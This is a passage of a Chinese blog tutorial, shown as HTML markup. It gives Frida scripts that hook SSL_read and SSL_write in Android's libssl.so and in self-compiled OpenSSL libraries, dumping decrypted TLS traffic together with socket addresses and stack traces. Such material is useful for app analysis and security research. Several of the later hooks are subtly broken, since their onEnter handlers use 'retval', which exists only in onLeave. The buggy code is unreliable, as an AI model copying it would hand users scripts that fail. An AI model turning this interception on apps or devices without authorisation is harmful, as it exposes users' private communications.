class_">Interceptor</span>.<span class="title function_">attach</span>(read_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;go into libssl.so-&gt;SSL_read&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;SSL_read&quot;</span>) </span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---libssl.so-&gt;SSL_read:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;leave libssl.so-&gt;SSL_read&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(write_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]go into libssl.so-&gt;SSL_write&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;SSL_write&quot;</span>)  </span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---libssl.so-&gt;SSL_write:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]leave libssl.so-&gt;SSL_write&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookopenssl2</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/4.1.2.png" class=""><p>建立Socket通信以后，需要调用<code>SSL_set_fd()</code>完成当前Socket ID和SSL的绑定，结束通信时调用<code>SSL_get_fd()</code>。要获取IP地址则需用到这个API。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printNativeStack</span>(<span class="params">context, name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">    <span class="keyword">var</span> first = <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(array[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">//在Java层没有找到才打印JNI层中的信息，避免重复打印</span></span><br><span class="line">    <span class="keyword">if</span>(first.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;libopenjdk.so!NET_Send&quot;</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> trace = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]start:&quot;</span> + name)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + trace)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]end:&quot;</span> + name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getsocketdetail</span>(<span class="params">fd</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">var</span> type = <span class="title class_">Socket</span>.<span class="title function_">type</span>(fd)</span><br><span class="line">    <span class="keyword">if</span> (type != <span class="literal">null</span>)&#123;</span><br><span class="line">        result = result + <span class="string">&quot;type:&quot;</span> + type</span><br><span class="line">        <span class="keyword">var</span> peer = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd)</span><br><span class="line">        <span class="keyword">var</span> local = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd)</span><br><span class="line">        result = result + <span class="string">&quot;,address:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(peer) + <span class="string">&quot;,local&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(local)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getip</span>(<span class="params">ip_ptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">ptr</span>(ip_ptr).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">2</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">3</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getudpaddr</span>(<span class="params">addrptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> port_ptr = addrptr.<span class="title function_">add</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">var</span> port = <span class="title function_">ptr</span>(port_ptr).<span class="title function_">readU8</span>()*<span class="number">256</span> + <span class="title function_">ptr</span>(port_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">var</span> ip_ptr = addrptr.<span class="title function_">add</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">var</span> ip_addr = <span class="title function_">getip</span>(ip_ptr)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;peer:&quot;</span> + ip_addr + <span class="string">&quot;,port:&quot;</span> + port</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookopenssl3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libsslmodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libssl.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> read_addr = libsslmodule.<span class="title function_">getExportByName</span>(<span class="string">&quot;SSL_read&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> write_addr = libsslmodule.<span class="title function_">getExportByName</span>(<span class="string">&quot;SSL_write&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> SSL_get_rfd_ptr = libsslmodule.<span class="title function_">getExportByName</span>(<span class="string">&quot;SSL_get_rfd&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> SSL_get_rfd = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(SSL_get_rfd_ptr, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(read_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;go into libssl.so-&gt;SSL_read&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;SSL_read&quot;</span>) </span><br><span class="line">            <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> sockfd = <span class="title function_">SSL_get_rfd</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>)</span><br><span class="line">                <span class="keyword">var</span> socketdetail = <span class="title function_">getsocketdetail</span>(sockfd)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(socketdetail + <span class="string">&quot;---[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---libssl.so-&gt;SSL_read:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;leave libssl.so-&gt;SSL_read&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(write_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]go into libssl.so-&gt;SSL_write&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;SSL_write&quot;</span>)  </span><br><span class="line">            <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> sockfd = <span class="title function_">SSL_get_rfd</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>)</span><br><span class="line">                <span class="keyword">var</span> socketdetail = <span class="title function_">getsocketdetail</span>(sockfd)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(socketdetail + <span class="string">&quot;---[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---libssl.so-&gt;SSL_write:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]leave libssl.so-&gt;SSL_write&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookopenssl3</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h1 id="5-自编译openssl库抓包"><a href="#5-自编译openssl库抓包" class="headerlink" title="5. 自编译openssl库抓包"></a>5. 自编译openssl库抓包</h1><p>一些App或浏览器并没有使用Android系统提供的ssl库，有可能使用了开源的ssl自编译生成本地库，再去调用本地库完成ssl通信。此时使用上面的API hook无法成功抓包和溯源。</p><p>那使用自编译的库进行SSL通信又如何解决呢？对于自编译的openssl库，如果<code>SSL_write()</code>和<code>SSL_read()</code>符号还在，直接遍历库中的符号表：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printNativeStack</span>(<span class="params">context, name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> trace = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">FUZZY</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]start:&quot;</span> + name)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + trace)</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]end:&quot;</span> + name)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getsocketdetail</span>(<span class="params">fd</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">var</span> type = <span class="title class_">Socket</span>.<span class="title function_">type</span>(fd)</span><br><span class="line">    <span class="keyword">if</span> (type != <span class="literal">null</span>)&#123;</span><br><span class="line">        result = result + <span class="string">&quot;type:&quot;</span> + type</span><br><span class="line">        <span class="keyword">var</span> peer = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd)</span><br><span class="line">        <span class="keyword">var</span> local = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd)</span><br><span class="line">        result = result + <span class="string">&quot;,address:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(peer) + <span class="string">&quot;,local&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(local)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookallssl</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libsslmodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libssl.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> SSL_get_rfd_ptr = libsslmodule.<span class="title function_">getExportByName</span>(<span class="string">&quot;SSL_get_rfd&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> SSL_get_rfd = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(SSL_get_rfd_ptr,<span class="string">&#x27;int&#x27;</span>,[<span class="string">&#x27;pointer&#x27;</span>])</span><br><span class="line">    <span class="title class_">Process</span>.<span class="title function_">enumerateModules</span>().<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params"><span class="variable language_">module</span></span>)&#123;</span><br><span class="line">        <span class="variable language_">module</span>.<span class="title function_">enumerateExports</span>().<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">symbol</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> name = symbol.<span class="property">name</span></span><br><span class="line">            <span class="keyword">if</span>(name == <span class="string">&#x27;SSL_read&#x27;</span>)&#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(symbol.<span class="property">address</span>, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;go into [&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol))</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol))  </span><br><span class="line">            <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> sockfd = <span class="title function_">SSL_get_rfd</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>)</span><br><span class="line">                <span class="keyword">var</span> socketdetail = <span class="title function_">getsocketdetail</span>(sockfd)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(socketdetail + <span class="string">&quot;---[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol) + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leave [&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(name == <span class="string">&#x27;SSL_write&#x27;</span>)&#123;</span><br><span class="line">                <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(symbol.<span class="property">address</span>, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;go into [&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol))</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>, <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol))  </span><br><span class="line">            <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> sockfd = <span class="title function_">SSL_get_rfd</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>)</span><br><span class="line">                <span class="keyword">var</span> socketdetail = <span class="title function_">getsocketdetail</span>(sockfd)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(socketdetail + <span class="string">&quot;---[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol) + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leave [&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">module</span>) + <span class="string">&quot;---&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(symbol))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span 